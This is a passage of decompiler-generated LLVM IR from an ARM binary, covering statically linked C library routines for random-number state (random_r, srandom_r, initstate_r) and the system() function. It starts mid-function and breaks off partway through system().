  %v2_13d44 = load i32, i32* %v1_13d44, align 4
  store i32 %v2_13d44, i32* %r2.global-to-local, align 4
  %v2_13d4c = mul i32 %v2_13d44, 1103515245
  %v1_13d54 = add i32 %v2_13d4c, 12345
  %tmp10 = bitcast i32 %v1_13d54 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_13d58 = bitcast float %tmp11 to i32
  store i32 %v1_13d58, i32* %r3.global-to-local, align 4
  store i32 %v1_13d58, i32* %v1_13d44, align 4
  %v0_13d60 = load i32, i32* %r3.global-to-local, align 4
  %v2_13d60 = inttoptr i32 %arg2 to i32*
  store i32 %v0_13d60, i32* %v2_13d60, align 4
  br label %dec_label_pc_13dac

dec_label_pc_13d68:                               ; preds = %entry
  %v2_13d68 = load i32, i32* %arg1, align 4
  store i32 %v2_13d68, i32* %r2.global-to-local, align 4
  %v1_13d6c = add i32 %tmp, 4
  %v2_13d6c = inttoptr i32 %v1_13d6c to i32*
  %v3_13d6c = load i32, i32* %v2_13d6c, align 4
  store i32 %v3_13d6c, i32* %r0.global-to-local, align 4
  %v1_13d70 = inttoptr i32 %v2_13d68 to i32*
  %v2_13d70 = load i32, i32* %v1_13d70, align 4
  store i32 %v2_13d70, i32* %r3.global-to-local, align 4
  %v1_13d74 = inttoptr i32 %v3_13d6c to i32*
  %v2_13d74 = load i32, i32* %v1_13d74, align 4
  %v4_13d74 = add i32 %v3_13d6c, 4
  store i32 %v4_13d74, i32* %r0.global-to-local, align 4
  %v2_13d78 = add i32 %v2_13d74, %v2_13d70
  store i32 %v2_13d78, i32* %r3.global-to-local, align 4
  store i32 %v2_13d78, i32* %v1_13d70, align 4
  %v3_13d7c = load i32, i32* %r2.global-to-local, align 4
  %v4_13d7c = add i32 %v3_13d7c, 4
  store i32 %v4_13d7c, i32* %r2.global-to-local, align 4
  %v0_13d80 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d80 = add i32 %v0_13d80, 24
  %v2_13d80 = inttoptr i32 %v1_13d80 to i32*
  %v3_13d80 = load i32, i32* %v2_13d80, align 4
  store i32 %v3_13d80, i32* %r4.global-to-local, align 4
  %v0_13d84 = load i32, i32* %r3.global-to-local, align 4
  %v3_13d84 = udiv i32 %v0_13d84, 2
  store i32 %v3_13d84, i32* %r3.global-to-local, align 4
  %v3_13d88 = icmp ult i32 %v4_13d7c, %v3_13d80
  %v1_13d8c = load i32, i32* %r5.global-to-local, align 4
  %v2_13d8c = inttoptr i32 %v1_13d8c to i32*
  store i32 %v3_13d84, i32* %v2_13d8c, align 4
  br i1 %v3_13d88, label %dec_label_pc_13d9c, label %bb

bb:                                               ; preds = %dec_label_pc_13d68
  %v1_13d90 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13d90, i32* %r2.global-to-local, align 4
  %v0_13d94 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13d94, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_13d9c:                               ; preds = %dec_label_pc_13d68
  %v0_13d941 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13d941, i32* %r3.global-to-local, align 4
  %v1_13d9c = load i32, i32* %r4.global-to-local, align 4
  %v3_13d9c = icmp ult i32 %v0_13d941, %v1_13d9c
  br i1 %v3_13d9c, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_13d9c
  store i32 %v0_13d941, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_13d9c
  %v1_13da4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13da4, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_13da8 = load i32, i32* %ip.global-to-local, align 4
  %v1_13da8 = inttoptr i32 %v0_13da8 to i32*
  %v2_13da8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_13da8, i32* %v1_13da8, align 4
  %v3_13da8 = add i32 %v0_13da8, 4
  %v4_13da8 = inttoptr i32 %v3_13da8 to i32*
  %v5_13da8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_13da8, i32* %v4_13da8, align 4
  br label %dec_label_pc_13dac

dec_label_pc_13dac:                               ; preds = %dec_label_pc_13d44, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13db0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13db0, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_13d941, { 1, 0, 2 }
  uselistorder i32 %v3_13d84, { 1, 0 }
  uselistorder i32 %v1_13d58, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder label %dec_label_pc_13dac, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13db8 = load i32, i32* @r4, align 4
  store i32 %v3_13db8, i32* %stack_var_-32, align 4
  %v6_13db8 = load i32, i32* @r5, align 4
  %v1_13dbc = add i32 %tmp, 12
  %v2_13dbc = inttoptr i32 %v1_13dbc to i32*
  %v3_13dbc = load i32, i32* %v2_13dbc, align 4
  %v2_13dc4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_13dbc, 4
  br i1 %tmp29, label %.dec_label_pc_13e70_crit_edge, label %dec_label_pc_13dd4

.dec_label_pc_13e70_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_13e70

dec_label_pc_13dd4:                               ; preds = %entry
  %v0_13dd4 = load i32, i32* @r0, align 4
  %v2_13dd4 = icmp eq i32 %v0_13dd4, 0
  %v1_13dd8 = add i32 %tmp, 8
  %v2_13dd8 = inttoptr i32 %v1_13dd8 to i32*
  %v3_13dd8 = load i32, i32* %v2_13dd8, align 4
  store i32 %v3_13dd8, i32* %r7.global-to-local, align 4
  br i1 %v2_13dd4, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_13dd4
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_13dd4, %bb
  %v0_13de4 = phi i32 [ %v0_13dd4, %dec_label_pc_13dd4 ], [ 1, %bb ]
  %v2_13de0 = icmp eq i32 %v3_13dbc, 0
  %v2_13de4 = inttoptr i32 %v3_13dd8 to i32*
  store i32 %v0_13de4, i32* %v2_13de4, align 4
  br i1 %v2_13de0, label %dec_label_pc_13e6c, label %dec_label_pc_13dec

dec_label_pc_13dec:                               ; preds = %bb21
  %v1_13dec = add i32 %tmp, 16
  %v2_13dec = inttoptr i32 %v1_13dec to i32*
  %v3_13dec = load i32, i32* %v2_13dec, align 4
  store i32 %v3_13dec, i32* %sb.global-to-local, align 4
  %v0_13df0 = load i32, i32* @r0, align 4
  %v0_13df4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13df4, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_13e3c23 = icmp sgt i32 %v3_13dec, 1
  br i1 %v5_13e3c23, label %dec_label_pc_13e00, label %dec_label_pc_13e40

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13dec, %dec_label_pc_13e00
  %v0_13e1025 = phi i32 [ %v0_13e30.pre, %dec_label_pc_13e00 ], [ %v0_13df0, %dec_label_pc_13dec ]
  %v1_13e2824 = phi i32 [ %v5_13e28, %dec_label_pc_13e00 ], [ %v0_13df4, %dec_label_pc_13dec ]
  %v2_13e00 = srem i32 %v0_13e1025, 127773
  %v2_13e0c = mul i32 %v2_13e00, 16807
  %v2_13e14 = sdiv i32 %v0_13e1025, 127773
  %tmp30 = mul nsw i32 %v2_13e14, -2836
  %v2_13e20 = add i32 %v2_13e0c, %tmp30
  %v8_13e20 = icmp slt i32 %v2_13e20, 0
  %v2_13e24 = add i32 %v2_13e20, 2147483647
  %v2_13e24.v2_13e20 = select i1 %v8_13e20, i32 %v2_13e24, i32 %v2_13e20
  store i32 %v2_13e24.v2_13e20, i32* @r5, align 4
  %v2_13e28 = add i32 %v1_13e2824, 4
  %v3_13e28 = inttoptr i32 %v2_13e28 to i32*
  store i32 %v2_13e24.v2_13e20, i32* %v3_13e28, align 4
  %v4_13e28 = load i32, i32* %sl.global-to-local, align 4
  %v5_13e28 = add i32 %v4_13e28, 4
  store i32 %v5_13e28, i32* %sl.global-to-local, align 4
  %v0_13e2c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_13e2c.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_13e30.pre = load i32, i32* @r5, align 4
  %v1_13e38 = add i32 %v0_13e2c.pre, 1
  store i32 %v1_13e38, i32* %r8.global-to-local, align 4
  %v5_13e3c = icmp slt i32 %v0_13e2c.pre, %v1_13e2c.pre
  br i1 %v5_13e3c, label %dec_label_pc_13e00, label %dec_label_pc_13e2c.dec_label_pc_13e40_crit_edge

dec_label_pc_13e2c.dec_label_pc_13e40_crit_edge:  ; preds = %dec_label_pc_13e00
  %v0_13e4c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13e40

dec_label_pc_13e40:                               ; preds = %dec_label_pc_13e2c.dec_label_pc_13e40_crit_edge, %dec_label_pc_13dec
  %v0_13e4c = phi i32 [ %v0_13e4c.pre, %dec_label_pc_13e2c.dec_label_pc_13e40_crit_edge ], [ %v0_13df4, %dec_label_pc_13dec ]
  %v0_13e44.lcssa = phi i32 [ %v1_13e2c.pre, %dec_label_pc_13e2c.dec_label_pc_13e40_crit_edge ], [ %v3_13dec, %dec_label_pc_13dec ]
  %v2_13e44 = mul i32 %v0_13e44.lcssa, 10
  store i32 %v2_13e44, i32* @r4, align 4
  %v0_13e48 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e48 = add i32 %v0_13e48, 20
  %v2_13e48 = inttoptr i32 %v1_13e48 to i32*
  %v3_13e48 = load i32, i32* %v2_13e48, align 4
  %v4_13e4c = mul i32 %v3_13e48, 4
  %v5_13e4c = add i32 %v0_13e4c, %v4_13e4c
  %v1_13e50 = inttoptr i32 %v0_13e48 to i32*
  store i32 %v5_13e4c, i32* %v1_13e50, align 4
  %v3_13e50 = add i32 %v0_13e48, 4
  %v4_13e50 = inttoptr i32 %v3_13e50 to i32*
  %v5_13e50 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_13e50, i32* %v4_13e50, align 4
  br label %dec_label_pc_13e5c

dec_label_pc_13e58:                               ; preds = %dec_label_pc_13e5c
  %v0_13e60 = load i32, i32* %r6.global-to-local, align 4
  %v2_13e58 = inttoptr i32 %v0_13e60 to i32*
  %v3_13e58 = call i32 @__GI_random_r(i32* %v2_13e58, i32 %v2_13dc4)
  br label %dec_label_pc_13e5c

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_13e40, %dec_label_pc_13e58
  %v0_13e5c = load i32, i32* @r4, align 4
  %v1_13e5c = add i32 %v0_13e5c, -1
  store i32 %v1_13e5c, i32* @r4, align 4
  %v6_13e5c = icmp slt i32 %v1_13e5c, 0
  br i1 %v6_13e5c, label %dec_label_pc_13e6c, label %dec_label_pc_13e58

dec_label_pc_13e6c:                               ; preds = %dec_label_pc_13e5c, %bb21
  %v2_13e74.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %.dec_label_pc_13e70_crit_edge, %dec_label_pc_13e6c
  %v2_13e74 = phi i32 [ %v3_13db8, %.dec_label_pc_13e70_crit_edge ], [ %v2_13e74.pre, %dec_label_pc_13e6c ]
  %v26_13e74 = phi i32 [ -1, %.dec_label_pc_13e70_crit_edge ], [ 0, %dec_label_pc_13e6c ]
  store i32 %v2_13e74, i32* @r4, align 4
  store i32 %v6_13db8, i32* @r5, align 4
  ret i32 %v26_13e74

; uselistorder directives
  uselistorder i32 %v1_13e5c, { 1, 0 }
  uselistorder i32 %v0_13e48, { 1, 0, 2 }
  uselistorder i32 %v0_13e2c.pre, { 1, 0 }
  uselistorder i32 %v5_13e28, { 1, 0 }
  uselistorder i32 %v2_13e20, { 2, 1, 0 }
  uselistorder i32 %v0_13e1025, { 1, 0 }
  uselistorder i32 %v0_13df4, { 1, 0, 2 }
  uselistorder i32 %v3_13dec, { 1, 0, 2 }
  uselistorder i32 %v3_13dbc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_13e70, { 1, 0 }
  uselistorder label %dec_label_pc_13e5c, { 1, 0 }
  uselistorder label %dec_label_pc_13e00, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.14"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13e78:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_13e78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13e78, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_13e78
  %v2_13e78 = load i32, i32* @r7, align 4
  %v5_13e78 = udiv i32 %v2_13e78, 8
  %v6_13e78 = and i32 %v5_13e78, %arg1
  store i32 %v6_13e78, i32* %r4.global-to-local, align 4
  %v2_13e7c = load i32, i32* @sp, align 4
  %v8_13e7c = shl i32 %v2_13e7c, %arg3
  %v9_13e7c = and i32 %v8_13e7c, %arg2
  call void @__pseudo_branch(i32 %v9_13e7c)
  %v0_13e80.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_13e80 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_13e80.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_13e80 = load i32, i32* %r4.global-to-local, align 4
  %v3_13e80 = load i32, i32* @fp, align 4
  %v8_13e80 = shl i32 %v2_13e80, %v3_13e80
  %v9_13e80 = and i32 %v8_13e80, %v1_13e80
  store i32 %v9_13e80, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_13e78, %bb
  %v10_13e80 = phi i32 [ %arg1, %dec_label_pc_13e78 ], [ %v9_13e80, %bb ], [ %v1_13e80, %.thread ]
  ret i32 %v10_13e80

; uselistorder directives
  uselistorder i32 %v1_13e80, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13e88 = load i32, i32* @r4, align 4
  store i32 %v3_13e88, i32* %stack_var_-20, align 4
  %v6_13e88 = load i32, i32* @r5, align 4
  %v12_13e88 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_13ea8, label %dec_label_pc_13e98

dec_label_pc_13e98:                               ; preds = %entry
  %v2_13e98 = icmp ugt i32 %arg2, 254
  %v7_13e98 = icmp eq i32 %arg2, 255
  %v2_13e9c = xor i1 %v7_13e98, true
  %v3_13e9c = and i1 %v2_13e98, %v2_13e9c
  br i1 %v3_13e9c, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_13e98
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_13e98, %bb
  %v1_13ed07 = phi i32 [ %v3_13e88, %dec_label_pc_13e98 ], [ 4, %bb ]
  %v2_13ea0 = xor i1 %v2_13e98, true
  %v3_13ea0 = or i1 %v7_13e98, %v2_13ea0
  br i1 %v3_13ea0, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_13ea8:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_13ec0, label %dec_label_pc_13eb0

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13ea8
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_13f2c

.thread10:                                        ; preds = %dec_label_pc_13eb0
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_13ec0:                               ; preds = %dec_label_pc_13ea8
  %v2_13ec0 = icmp ugt i32 %arg2, 62
  %v7_13ec0 = icmp eq i32 %arg2, 63
  %v2_13ec4 = xor i1 %v7_13ec0, true
  %v3_13ec4 = and i1 %v2_13ec0, %v2_13ec4
  br i1 %v3_13ec4, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_13ec0
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_13ec0, %bb22
  %v1_13ed06 = phi i32 [ %v3_13e88, %dec_label_pc_13ec0 ], [ 2, %bb22 ]
  %v2_13ec8 = xor i1 %v2_13ec0, true
  %v3_13ec8 = or i1 %v7_13ec0, %v2_13ec8
  br i1 %v3_13ec8, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_13ed8 = phi i32 [ 3, %bb21 ], [ %v1_13ed07, %bb20 ], [ %v1_13ed06, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_1e254.743 to i32), i32* %r2.global-to-local, align 4
  %v4_13ed0 = mul i32 %v1_13ed8, 4
  %v5_13ed0 = add i32 %v4_13ed0, ptrtoint (i32* @global_var_1e254.743 to i32)
  store i32 %v5_13ed0, i32* %r3.global-to-local, align 4
  %v1_13ed4 = add i32 %v4_13ed0, add (i32 ptrtoint (i32* @global_var_1e254.743 to i32), i32 20)
  %v2_13ed4 = inttoptr i32 %v1_13ed4 to i32*
  %v3_13ed4 = load i32, i32* %v2_13ed4, align 4
  store i32 %v3_13ed4, i32* %r1.global-to-local, align 4
  %v6_13ed8 = inttoptr i32 %v5_13ed0 to i32*
  %v7_13ed8 = load i32, i32* %v6_13ed8, align 4
  store i32 %v7_13ed8, i32* %r2.global-to-local, align 4
  %v1_13edc = add i32 %tmp, 4
  store i32 %v1_13edc, i32* @r6, align 4
  %v4_13ee0 = mul i32 %v3_13ed4, 4
  %v5_13ee0 = add i32 %v4_13ee0, %v1_13edc
  store i32 %v5_13ee0, i32* %r3.global-to-local, align 4
  %v2_13ee4 = add i32 %arg3, 24
  %v3_13ee4 = inttoptr i32 %v2_13ee4 to i32*
  store i32 %v5_13ee0, i32* %v3_13ee4, align 4
  %v0_13ee8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ee8 = load i32, i32* @r5, align 4
  %v2_13ee8 = add i32 %v1_13ee8, 20
  %v3_13ee8 = inttoptr i32 %v2_13ee8 to i32*
  store i32 %v0_13ee8, i32* %v3_13ee8, align 4
  %v0_13eec = load i32, i32* %r1.global-to-local, align 4
  %v1_13eec = load i32, i32* @r5, align 4
  %v2_13eec = add i32 %v1_13eec, 16
  %v3_13eec = inttoptr i32 %v2_13eec to i32*
  store i32 %v0_13eec, i32* %v3_13eec, align 4
  %v0_13ef0 = load i32, i32* @r4, align 4
  %v1_13ef0 = load i32, i32* @r5, align 4
  %v2_13ef0 = add i32 %v1_13ef0, 12
  %v3_13ef0 = inttoptr i32 %v2_13ef0 to i32*
  store i32 %v0_13ef0, i32* %v3_13ef0, align 4
  %v0_13ef4 = load i32, i32* @r6, align 4
  %v1_13ef4 = load i32, i32* @r5, align 4
  %v2_13ef4 = add i32 %v1_13ef4, 8
  %v3_13ef4 = inttoptr i32 %v2_13ef4 to i32*
  store i32 %v0_13ef4, i32* %v3_13ef4, align 4
  %v0_13ef8 = load i32, i32* @r5, align 4
  store i32 %v0_13ef8, i32* %r1.global-to-local, align 4
  %v0_13efc = load i32, i32* @r0, align 4
  %v2_13efc = inttoptr i32 %v0_13efc to i32*
  %v3_13efc = call i32 @srandom_r(i32* %v2_13efc, i32 %v0_13ef8)
  store i32 %v3_13efc, i32* %r0.global-to-local, align 4
  %v0_13f00 = load i32, i32* @r4, align 4
  %v2_13f00 = icmp eq i32 %v0_13f00, 0
  br i1 %v2_13f00, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_13f1c12 = load i32, i32* @r7, align 4
  %v2_13f1c13 = inttoptr i32 %v1_13f1c12 to i32*
  store i32 0, i32* %v2_13f1c13, align 4
  %v1_13f20 = load i32, i32* @r4, align 4
  store i32 %v1_13f20, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_13f04 = load i32, i32* @r5, align 4
  %v2_13f04 = add i32 %v1_13f04, 4
  %v3_13f04 = inttoptr i32 %v2_13f04 to i32*
  %v4_13f04 = load i32, i32* %v3_13f04, align 4
  %v1_13f08 = load i32, i32* @r6, align 4
  %v3_13f08 = sub i32 %v4_13f04, %v1_13f08
  %v4_13f0c = sdiv i32 %v3_13f08, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_13f14 = mul i32 %v4_13f0c, 5
  %v5_13f14 = add i32 %v4_13f14, %v0_13f00
  store i32 %v5_13f14, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13f1c = load i32, i32* @r7, align 4
  %v2_13f1c = inttoptr i32 %v1_13f1c to i32*
  store i32 0, i32* %v2_13f1c, align 4
  %v1_13f24 = load i32, i32* %r3.global-to-local, align 4
  %v2_13f24 = load i32, i32* @r7, align 4
  %v3_13f24 = inttoptr i32 %v2_13f24 to i32*
  store i32 %v1_13f24, i32* %v3_13f24, align 4
  %v17_13f28.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_13f28 = phi i32 [ %v1_13f20, %bb26 ], [ %v17_13f28.pre, %.thread4 ]
  %v2_13f28 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13f28, i32* @r4, align 4
  store i32 %v6_13e88, i32* @r5, align 4
  store i32 %v12_13e88, i32* @r7, align 4
  ret i32 %v17_13f28

dec_label_pc_13f2c:                               ; preds = %dec_label_pc_13eb0
  %v0_13f2c = call i32 @__errno_location()
  store i32 %v0_13f2c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_13f34 = inttoptr i32 %v0_13f2c to i32*
  store i32 22, i32* %v2_13f34, align 4
  %v0_13f38 = call i32 @__errno_location()
  %v0_13f3c = load i32, i32* %r4.global-to-local, align 4
  %v2_13f3c = inttoptr i32 %v0_13f38 to i32*
  store i32 %v0_13f3c, i32* %v2_13f3c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13f44 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13f44, i32* @r4, align 4
  store i32 %v6_13e88, i32* @r5, align 4
  store i32 %v12_13e88, i32* @r7, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_13ec0, { 1, 0 }
  uselistorder i1 %v7_13e98, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1e254.743 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1e254.743 to i32), { 2, 3, 1, 0 }
  uselistorder i32 63, { 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_13f50 = load i32, i32* %r0.global-to-local, align 4
  %v2_13f50 = icmp eq i32 %v0_13f50, 0
  br i1 %v2_13f50, label %bb, label %dec_label_pc_13f64

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14070

dec_label_pc_13f64:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_13f6c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_13f7c = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_13f8c = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_13f8c, i32* %r0.global-to-local, align 4
  %v1_13f94 = call i32 @__vfork(i32 %v2_13f8c)
  store i32 %v1_13f94, i32* %r0.global-to-local, align 4
  store i32 %v1_13f94, i32* @r4, align 4
  %v1_13f98 = icmp slt i32 %v1_13f94, 0
  br i1 %v1_13f98, label %dec_label_pc_13fa0, label %dec_label_pc_13fcc

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_13f64
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_13fa8 = call i32 @__bsd_signal(i32 3, i32 %v2_13f6c)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_13fb4 = call i32 @__bsd_signal(i32 2, i32 %v2_13f7c)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_13fc0 = call i32 @__bsd_signal(i32 17, i32 %v2_13f8c)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14070

dec_label_pc_13fcc:                               ; preds = %dec_label_pc_13f64
  %v2_13f98 = icmp eq i32 %v1_13f94, 0
  br i1 %v2_13f98, label %dec_label_pc_13fd0, label %dec_label_pc_14014

dec_label_pc_13fd0:                               ; preds = %dec_label_pc_13fcc
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_13fd8 = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_13fdc = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_13fe4 = call i32 @__bsd_signal(i32 2, i32 %v0_13fdc)
  %v0_13fe8 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_13ff0 = call i32 @__bsd_signal(i32 17, i32 %v0_13fe8)
  store i32 ptrtoint ([8 x i8]* @global_var_1e27c.750 to i32), i32* @r0, align 4
  %v0_14004 = load i32, i32* @r4, align 4
  %v8_14008 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1e27c.750 to i32), i32 ptrtoint ([3 x i8]* @global_var_1e284.752 to i32), i32 ptrtoint ([3 x i8]* @global_var_1e288.754 to i32), i32 %v0_13f50, i32 %v0_14004)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_14010 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_14014:                               ; preds = %dec_label_pc_13fcc
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1401c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_14028 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_14038 = load i32, i32* @r4, align 4
  store i32 %v0_14038, i32* %r0.global-to-local, align 4
  %v0_1403c = call i32 @wait4()
  store i32 %v0_1403c, i32* %r0.global-to-local, align 4
  %v7_14040 = icmp eq i32 %v0_1403c, -1
  br i1 %v7_14040, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_14014
  store i32 %v0_1403c, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_14014, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_14050 = call i32 @__bsd_signal(i32 3, i32 %v2_13f6c)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1405c = call i32 @__bsd_signal(i32 2, i32 %v2_13f7c)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_14068 = call i32 @__bsd_signal(i32 17, i32 %v2_13f8c)
  %v3_1406c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_1406c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14070

dec_label_pc_14070:                               ; preds = %bb, %dec_label_pc_13fa0, %bb11
  %v8_14074 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_13fa0 ], [ %v3_1406c, %bb11 ]
